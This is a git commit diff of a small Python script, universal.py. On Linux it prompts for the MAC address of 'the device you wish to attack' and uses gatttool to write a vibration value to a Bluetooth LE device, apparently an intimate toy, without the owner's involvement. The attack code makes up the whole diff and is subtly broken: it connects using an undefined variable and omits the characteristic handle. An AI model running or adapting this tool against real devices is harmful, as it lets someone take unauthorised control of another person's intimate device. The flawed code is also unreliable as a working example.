e1e72b640ccaa0d37936b5c77d893377dbb28069
Rob Shannon <rob_shannon539@hotmail.com>
2020-08-22 10:12:47 +0100

    Clean up of code
    Fix the indents, remove MacOS for now, moved the linux commands to where they should go

--- universal.py
+++ universal.py
@@ -10,30 +10,30 @@ os = platform.system()
 
 if os == "Windows":
 	print("Windows is detected")
-
+#Enter WIndows API here
 elif os == "Linux":
 	print("Linux is detected")
+	print("Ensure you have the mac address of the device you wish to attack")
+	print("Enter the mac address")
+	mac = input("")
+	print("Enter the vibration")
+	vibration = input("")
+	print("gatttool is starting up")
+	child = pexpect.spawn("gatttool -I")
+	child.sendline("connect {0}".format(dildo))
+	child.expect("Connection successful"),
+	command="char-write-req {0}".format(vibration)
+	time.sleep(5)
+	child.sendline(command)
+	child.expect("Characteristic value was written successfully", timeout=10)    
 
-elif os == "Darwin":
-	Print("MacOS detected")
 else:
-	Print("Unsure what os is running")
+	print("Unsure what os is running")
+	time.sleep(15)
+	sys.exit(0)
 
 
-print("Ensure you have the mac address of the device you wish to attack")
 
-print("Enter the mac address")
-mac = input("")
 
-print("Enter the vibration")
-vibration = input("")
 
-if os == "Linux":
-print("gatttool is starting up")
-child = pexpect.spawn("gatttool -I")
-child.sendline("connect {0}".format(dildo))
-child.expect("Connection successful"),
-command="char-write-req {0}".format(vibration)
-time.sleep(5)
-child.sendline(command)
-child.expect("Characteristic value was written successfully", timeout=10)
+
